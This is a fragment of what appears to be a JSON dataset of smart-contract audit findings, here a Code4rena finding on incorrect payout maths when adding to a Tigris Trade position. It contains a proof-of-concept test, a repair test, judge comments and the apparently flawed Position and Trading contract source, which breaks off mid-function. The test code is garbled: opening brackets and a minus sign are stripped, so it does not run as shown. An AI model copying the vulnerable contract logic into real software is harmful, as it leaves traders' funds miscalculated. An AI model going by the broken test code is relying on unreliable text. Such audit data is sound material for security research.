earns $1000 profit.\n      // The expected PnL payout = old margin + earned profit + new margin\n      //                         = $500 + $1000 + $500\n      //                         = $2000\n      let addingPrice = parseEther('2000');\n      let addingPriceData = node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('1666'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('1667'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\", async function () {\n      // The price decreases from $1000 to $750, the old position losses $250.\n      // The expected PnL payout = old margin loss + new margin\n      //                         = $500 $250 + $500\n      //                         = $750\n      let addingPrice = parseEther('750');\n      let addingPriceData = node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('714'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('715'))).to.be.true;\n    });\n\n  });\n});\n\n\n\nThe test result\n\n    Incorrect calculation of new margin price while adding position\n        Initial margin $500, leverage 2x, position $1000, price $1000\n          \u221a Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\n          \u221a Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\n\n\nHardhat\n\n",
                "Repair": "\nUse the correct formula, the following test case is for the same above examples after fix.\n\n\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Correct calculation of new margin price while adding position\", function () {\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", 2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {\n    let orderId;\n    let initPrice = parseEther(\"1000\");\n    beforeEach(async function () {\n      // To simpliy the problem, set fees to 0\n      await trading.setFees(true, 0, 0, 0, 0, 0);\n      await trading.setFees(false, 0, 0, 0, 0, 0);\n\n      let TradeInfo = parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\n      expect(trade.price.eq(parseEther('1000'))).to.be.true;\n      expect(trade.leverage.eq(parseEther('2'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\", async function () {\n      // The price increases from $1000 to $2000, the old position earns $1000 profit.\n      // The expected PnL payout = old margin + earned profit + new margin\n      //                         = $500 + $1000 + $500\n      //                         = $2000\n      let addingPrice = parseEther('2000');\n      let addingPriceData = node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('2000'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\", async function () {\n      // The price decreases from $1000 to $750, the old position losses $250.\n      // The expected PnL payout = old margin loss + new margin\n      //                         = $500 $250 + $500\n      //                         = $750\n      let addingPrice = parseEther('750');\n      let addingPriceData = node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('750'))).to.be.true;\n    });\n\n  });\n});\n\n\n\nThe test result\n\n    Correct calculation of new margin price while adding position\n        Initial margin $500, leverage 2x, position $1000, price $1000\n          \u221a Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\n          \u221a Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\n\nTriHaz (Tigris Trade) confirmed(https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1375841573)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1384495437):\n  The warden has shown how, using addToPosition can cause the payout math to become incorrect, because this highlights an issue with the math of the protocol, which will impact its functionality, I believe High Severity to be appropriate.\n\nGainsGoblin (Tigris Trade) resolved(https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1407511530):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174986 \n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/IPosition.sol\";\n\ncontract Position is ERC721Enumerable, MetaContext, IPosition {\n\n    function ownerOf(uint _id) public view override(ERC721, IERC721, IPosition) returns (address) {\n        return ERC721.ownerOf(_id);\n    }\n\n    using Counters for Counters.Counter;\n    uint constant public DIVISION_CONSTANT = 1e10; // 100%\n\n    mapping(uint => mapping(address => uint)) public vaultFundingPercent;\n\n    mapping(address => bool) private _isMinter; // Trading contract should be minter\n    mapping(uint256 => Trade) private _trades; // NFT id to Trade\n\n    uint256[] private _openPositions;\n    mapping(uint256 => uint256) private _openPositionsIndexes;\n\n    mapping(uint256 => uint256[]) private _assetOpenPositions;\n    mapping(uint256 => mapping(uint256 => uint256)) private _assetOpenPositionsIndexes;\n\n    mapping(uint256 => uint256[]) private _limitOrders; // List of limit order nft ids per asset\n    mapping(uint256 => mapping(uint256 => uint256)) private _limitOrderIndexes; // Keeps track of asset -> id -> array index\n\n    // Funding\n    mapping(uint256 => mapping(address => int256)) public fundingDeltaPerSec;\n    mapping(uint256 => mapping(address => mapping(bool => int256))) private accInterestPerOi;\n    mapping(uint256 => mapping(address => uint256)) private lastUpdate;\n    mapping(uint256 => int256) private initId;\n    mapping(uint256 => mapping(address => uint256)) private longOi;\n    mapping(uint256 => mapping(address => uint256)) private shortOi;\n\n    function isMinter(address _address) public view returns (bool) { return _isMinter[_address]; }\n    function trades(uint _id) public view returns (Trade memory) {\n        Trade memory _trade = _trades[_id];\n        _trade.trader = ownerOf(_id);\n        if (_trade.orderType > 0) return _trade;\n        \n        int256 _pendingFunding;\n        if (_trade.direction && longOi[_trade.asset][_trade.tigAsset] > 0) {\n            _pendingFunding = (int256(block.timestamp-lastUpdate[_trade.asset][_trade.tigAsset])*fundingDeltaPerSec[_trade.asset][_trade.tigAsset])*1e18/int256(longOi[_trade.asset][_trade.tigAsset]);\n            if (longOi[_trade.asset][_trade.tigAsset] > shortOi[_trade.asset][_trade.tigAsset]) {\n                _pendingFunding = -_pendingFunding;\n            } else {\n                _pendingFunding = _pendingFunding*int256(1e10-vaultFundingPercent[_trade.asset][_trade.tigAsset])/1e10;\n            }\n        } else if (shortOi[_trade.asset][_trade.tigAsset] > 0) {\n            _pendingFunding = (int256(block.timestamp-lastUpdate[_trade.asset][_trade.tigAsset])*fundingDeltaPerSec[_trade.asset][_trade.tigAsset])*1e18/int256(shortOi[_trade.asset][_trade.tigAsset]);\n            if (shortOi[_trade.asset][_trade.tigAsset] > longOi[_trade.asset][_trade.tigAsset]) {\n                _pendingFunding = -_pendingFunding;\n            } else {\n                _pendingFunding = _pendingFunding*int256(1e10-vaultFundingPercent[_trade.asset][_trade.tigAsset])/1e10;\n            }\n        }\n        _trade.accInterest += (int256(_trade.margin*_trade.leverage/1e18)*(accInterestPerOi[_trade.asset][_trade.tigAsset][_trade.direction]+_pendingFunding)/1e18)-initId[_id];\n        \n        return _trade;\n    }\n    function openPositions() public view returns (uint256[] memory) { return _openPositions; }\n    function openPositionsIndexes(uint _id) public view returns (uint256) { return _openPositionsIndexes[_id]; }\n    function assetOpenPositions(uint _asset) public view returns (uint256[] memory) { return _assetOpenPositions[_asset]; }\n    function assetOpenPositionsIndexes(uint _asset, uint _id) public view returns (uint256) { return _assetOpenPositionsIndexes[_asset][_id]; }\n    function limitOrders(uint _asset) public view returns (uint256[] memory) { return _limitOrders[_asset]; }\n    function limitOrderIndexes(uint _asset, uint _id) public view returns (uint256) { return _limitOrderIndexes[_asset][_id]; }\n\n    Counters.Counter private _tokenIds;\n    string public baseURI;\n\n    constructor(string memory _setBaseURI, string memory _name, string memory _symbol) ERC721(_name, _symbol) {\n        baseURI = _setBaseURI;\n        _tokenIds.increment();\n    }\n\n    function _baseURI() internal override view returns (string memory) {\n        return baseURI;\n    }\n\n    function setBaseURI(string memory _newBaseURI) external onlyOwner {\n        baseURI = _newBaseURI;\n    }\n\n    /**\n    * @notice Update funding rate after open interest change\n    * @dev only callable by minter\n    * @param _asset pair id\n    * @param _tigAsset tigAsset token address\n    * @param _longOi long open interest\n    * @param _shortOi short open interest\n    * @param _baseFundingRate base funding rate of a pair\n    * @param _vaultFundingPercent percent of earned funding going to the stablevault\n    */\n    function updateFunding(uint256 _asset, address _tigAsset, uint256 _longOi, uint256 _shortOi, uint256 _baseFundingRate, uint _vaultFundingPercent) external onlyMinter {\n        if(longOi[_asset][_tigAsset] < shortOi[_asset][_tigAsset]) {\n            if (longOi[_asset][_tigAsset] > 0) {\n                accInterestPerOi[_asset][_tigAsset][true] += ((int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(longOi[_asset][_tigAsset]))*int256(1e10-vaultFundingPercent[_asset][_tigAsset])/1e10;\n            }\n            accInterestPerOi[_asset][_tigAsset][false] -= (int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(shortOi[_asset][_tigAsset]);\n\n        } else if(longOi[_asset][_tigAsset] > shortOi[_asset][_tigAsset]) {\n            accInterestPerOi[_asset][_tigAsset][true] -= (int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(longOi[_asset][_tigAsset]);\n            if (shortOi[_asset][_tigAsset] > 0) {\n                accInterestPerOi[_asset][_tigAsset][false] += ((int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(shortOi[_asset][_tigAsset]))*int256(1e10-vaultFundingPercent[_asset][_tigAsset])/1e10;\n            }\n        }\n        lastUpdate[_asset][_tigAsset] = block.timestamp;\n        int256 _oiDelta;\n        if (_longOi > _shortOi) {\n            _oiDelta = int256(_longOi)-int256(_shortOi);\n        } else {\n            _oiDelta = int256(_shortOi)-int256(_longOi);\n        }\n        \n        fundingDeltaPerSec[_asset][_tigAsset] = (_oiDelta*int256(_baseFundingRate)/int256(DIVISION_CONSTANT))/31536000;\n        longOi[_asset][_tigAsset] = _longOi;\n        shortOi[_asset][_tigAsset] = _shortOi;\n        vaultFundingPercent[_asset][_tigAsset] = _vaultFundingPercent;\n    }\n\n    /**\n    * @notice mint a new position nft\n    * @dev only callable by minter\n    * @param _mintTrade New trade params in struct\n    */\n    function mint(\n        MintTrade memory _mintTrade\n    ) external onlyMinter {\n        uint newTokenID = _tokenIds.current();\n\n        Trade storage newTrade = _trades[newTokenID];\n        newTrade.margin = _mintTrade.margin;\n        newTrade.leverage = _mintTrade.leverage;\n        newTrade.asset = _mintTrade.asset;\n        newTrade.direction = _mintTrade.direction;\n        newTrade.price = _mintTrade.price;\n        newTrade.tpPrice = _mintTrade.tp;\n        newTrade.slPrice = _mintTrade.sl;\n        newTrade.orderType = _mintTrade.orderType;\n        newTrade.id = newTokenID;\n        newTrade.tigAsset = _mintTrade.tigAsset;\n\n        _safeMint(_mintTrade.account, newTokenID);\n        if (_mintTrade.orderType > 0) {\n            _limitOrders[_mintTrade.asset].push(newTokenID);\n            _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n        } else {\n            initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n            _openPositions.push(newTokenID);\n            _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n            _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n            _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n        }\n        _tokenIds.increment();\n    }\n\n    /**\n     * @param _id id of the position NFT\n     * @param _price price used for execution\n     * @param _newMargin margin after fees\n     */\n    function executeLimitOrder(uint256 _id, uint256 _price, uint256 _newMargin) external onlyMinter {\n        Trade storage _trade = _trades[_id];\n        if (_trade.orderType == 0) {\n            return;\n        }\n        _trade.orderType = 0;\n        _trade.price = _price;\n        _trade.margin = _newMargin;\n        uint _asset = _trade.asset;\n        _limitOrderIndexes[_asset][_limitOrders[_asset][_limitOrders[_asset].length-1]] = _limitOrderIndexes[_asset][_id];\n        _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n        delete _limitOrderIndexes[_asset][_id];\n        _limitOrders[_asset].pop();\n\n        _openPositions.push(_id);\n        _openPositionsIndexes[_id] = _openPositions.length-1;\n        _assetOpenPositions[_asset].push(_id);\n        _assetOpenPositionsIndexes[_asset][_id] = _assetOpenPositions[_asset].length-1;\n\n        initId[_id] = accInterestPerOi[_trade.asset][_trade.tigAsset][_trade.direction]*int256(_trade.margin*_trade.leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice modifies margin and leverage\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _newMargin new margin amount\n    * @param _newLeverage new leverage amount\n    */\n    function modifyMargin(uint256 _id, uint256 _newMargin, uint256 _newLeverage) external onlyMinter {\n        _trades[_id].margin = _newMargin;\n        _trades[_id].leverage = _newLeverage;\n    }\n\n    /**\n    * @notice modifies margin and entry price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _newMargin new margin amount\n    * @param _newPrice new entry price\n    */\n    function addToPosition(uint256 _id, uint256 _newMargin, uint256 _newPrice) external onlyMinter {\n        _trades[_id].margin = _newMargin;\n        _trades[_id].price = _newPrice;\n        initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_newMargin*_trades[_id].leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice Called before updateFunding for reducing position or adding to position, to store accumulated funding\n    * @dev only callable by minter\n    * @param _id position id\n    */\n    function setAccInterest(uint256 _id) external onlyMinter {\n        _trades[_id].accInterest = trades(_id).accInterest;\n    }\n\n    /**\n    * @notice Reduces position size by %\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _percent percent of a position being closed\n    */\n    function reducePosition(uint256 _id, uint256 _percent) external onlyMinter {\n        _trades[_id].accInterest -= _trades[_id].accInterest*int256(_percent)/int256(DIVISION_CONSTANT);\n        _trades[_id].margin -= _trades[_id].margin*_percent/DIVISION_CONSTANT;\n        initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_trades[_id].margin*_trades[_id].leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice change a position tp price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _tpPrice tp price\n    */\n    function modifyTp(uint _id, uint _tpPrice) external onlyMinter {\n        _trades[_id].tpPrice = _tpPrice;\n    }\n\n    /**\n    * @notice change a position sl price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _slPrice sl price\n    */\n    function modifySl(uint _id, uint _slPrice) external onlyMinter {\n        _trades[_id].slPrice = _slPrice;\n    }\n\n    /**\n    * @dev Burns an NFT and it's data\n    * @param _id ID of the trade\n    */\n    function burn(uint _id) external onlyMinter {\n        _burn(_id);\n        uint _asset = _trades[_id].asset;\n        if (_trades[_id].orderType > 0) {\n            _limitOrderIndexes[_asset][_limitOrders[_asset][_limitOrders[_asset].length-1]] = _limitOrderIndexes[_asset][_id];\n            _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n            delete _limitOrderIndexes[_asset][_id];\n            _limitOrders[_asset].pop();            \n        } else {\n            _assetOpenPositionsIndexes[_asset][_assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1]] = _assetOpenPositionsIndexes[_asset][_id];\n            _assetOpenPositions[_asset][_assetOpenPositionsIndexes[_asset][_id]] = _assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1];\n            delete _assetOpenPositionsIndexes[_asset][_id];\n            _assetOpenPositions[_asset].pop();  \n\n            _openPositionsIndexes[_openPositions[_openPositions.length-1]] = _openPositionsIndexes[_id];\n            _openPositions[_openPositionsIndexes[_id]] = _openPositions[_openPositions.length-1];\n            delete _openPositionsIndexes[_id];\n            _openPositions.pop();              \n        }\n        delete _trades[_id];\n    }\n\n    function assetOpenPositionsLength(uint _asset) external view returns (uint256) {\n        return _assetOpenPositions[_asset].length;\n    }\n\n    function limitOrdersLength(uint _asset) external view returns (uint256) {\n        return _limitOrders[_asset].length;\n    }\n\n    function getCount() external view returns (uint) {\n        return _tokenIds.current();\n    }\n\n    function userTrades(address _user) external view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](balanceOf(_user));\n        for (uint i=0; i<_ids.length; i++) {\n            _ids[i] = tokenOfOwnerByIndex(_user, i);\n        }\n        return _ids;\n    }\n\n    function openPositionsSelection(uint _from, uint _to) external view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](_to-_from);\n        for (uint i=0; i<_ids.length; i++) {\n            _ids[i] = _openPositions[i+_from];\n        }\n        return _ids;\n    }\n\n    function setMinter(address _minter, bool _bool) external onlyOwner {\n        _isMinter[_minter] = _bool;\n    }    \n\n    modifier onlyMinter() {\n        require(_isMinter[_msgSender()], \"!Minter\");\n        _;\n    }\n\n    // META-TX\n    function _msgSender() internal view override(Context, MetaContext) returns (address sender) {\n        return MetaContext._msgSender();\n    }\n    function _msgData() internal view override(Context, MetaContext) returns (bytes calldata) {\n        return MetaContext._msgData();\n    }\n}\n\n//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/ITrading.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./interfaces/IPairsContract.sol\";\nimport \"./interfaces/IReferrals.sol\";\nimport \"./interfaces/IPosition.sol\";\nimport \"./interfaces/IGovNFT.sol\";\nimport \"./interfaces/IStableVault.sol\";\nimport \"./utils/TradingLibrary.sol\";\n\ninterface ITradingExtension {\n    function getVerifiedPrice(\n        uint _asset,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        uint _withSpreadIsLong\n    ) external returns(uint256 _price, uint256 _spread);\n    function getRef(\n        address _trader\n    ) external pure returns(address);\n    function _setReferral(\n        bytes32 _referral,\n        address _trader\n    ) external;\n    function validateTrade(uint _asset, address _tigAsset, uint _margin, uint _leverage) external view;\n    function isPaused() external view returns(bool);\n    function minPos(address) external view returns(uint);\n    function modifyLongOi(\n        uint _asset,\n        address _tigAsset,\n        bool _onOpen,\n        uint _size\n    ) external;\n    function modifyShortOi(\n        uint _asset,\n        address _tigAsset,\n        bool _onOpen,\n        uint _size\n    ) external;\n    function paused() external returns(bool);\n    function _limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) external returns(uint _limitPrice, address _tigAsset);\n    function _checkGas() external view;\n    function _closePosition(\n        uint _id,\n        uint _price,\n        uint _percent\n    ) external returns (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout);\n}\n\ninterface IStable is IERC20 {\n    function burnFrom(address account, uint amount) external;\n    function mintFor(address account, uint amount) external;\n}\n\ninterface ExtendedIERC20 is IERC20 {\n    function decimals() external view returns (uint);\n}\n\ninterface ERC20Permit is IERC20 {\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\ncontract Trading is MetaContext, ITrading {\n\n    error LimitNotSet(); //7\n    error NotLiquidatable();\n    error TradingPaused();\n    error BadDeposit();\n    error BadWithdraw();\n    error ValueNotEqualToMargin();\n    error BadLeverage();\n    error NotMargin();\n    error NotAllowedPair();\n    error BelowMinPositionSize();\n    error BadClosePercent();\n    error NoPrice();\n    error LiqThreshold();\n\n    uint constant private DIVISION_CONSTANT = 1e10; // 100%\n    uint private constant liqPercent = 9e9; // 90%\n\n    struct Fees {\n        uint daoFees;\n        uint burnFees;\n        uint referralFees;\n        uint botFees;\n    }\n    Fees public openFees = Fees(\n        0,\n        0,\n        0,\n        0\n    );\n    Fees public closeFees = Fees(\n        0,\n        0,\n        0,\n        0\n    );\n    uint public limitOrderPriceRange = 1e8; // 1%\n\n    uint public maxWinPercent;\n    uint public vaultFundingPercent;\n\n    IPairsContract private pairsContract;\n    IPosition private position;\n    IGovNFT private gov;\n    ITradingExtension private tradingExtension;\n\n    struct Delay {\n        uint delay; // Block number where delay ends\n        bool actionType; // True for open, False for close\n    }\n    mapping(uint => Delay) public blockDelayPassed; // id => Delay\n    uint public blockDelay;\n    mapping(uint => uint) public limitDelay; // id => block.timestamp\n\n    mapping(address => bool) public allowedVault;\n\n    struct Proxy {\n        address proxy;\n        uint256 time;\n    }\n\n    mapping(address => Proxy) public proxyApprovals;\n\n    constructor(\n        address _position,\n        address _gov,\n        address _pairsContract\n    )\n    {\n        position = IPosition(_position);\n        gov = IGovNFT(_gov);\n        pairsContract = IPairsContract(_pairsContract);\n    }\n\n    // ===== END-USER FUNCTIONS =====\n\n    /**\n     * @param _tradeInfo Trade info\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function initiateMarketOrder(\n        TradeInfo calldata _tradeInfo,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkDelay(position.getCount(), true);\n        _checkVault(_tradeInfo.stableVault, _tradeInfo.marginAsset);\n        address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n        tradingExtension.validateTrade(_tradeInfo.asset, _tigAsset, _tradeInfo.margin, _tradeInfo.leverage);\n        tradingExtension._setReferral(_tradeInfo.referral, _trader);\n        uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\n        uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n        _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n        uint256 _isLong = _tradeInfo.direction ? 1 : 2;\n        (uint256 _price,) = tradingExtension.getVerifiedPrice(_tradeInfo.asset, _priceData, _signature, _isLong);\n        IPosition.MintTrade memory _mintTrade = IPosition.MintTrade(\n            _trader,\n            _marginAfterFees,\n            _tradeInfo.leverage,\n            _tradeInfo.asset,\n            _tradeInfo.direction,\n            _price,\n            _tradeInfo.tpPrice,\n            _tradeInfo.slPrice,\n            0,\n            _tigAsset\n        );\n        _checkSl(_tradeInfo.slPrice, _tradeInfo.direction, _price);\n        unchecked {\n            if (_tradeInfo.direction) {\n                tradingExtension.modifyLongOi(_tradeInfo.asset, 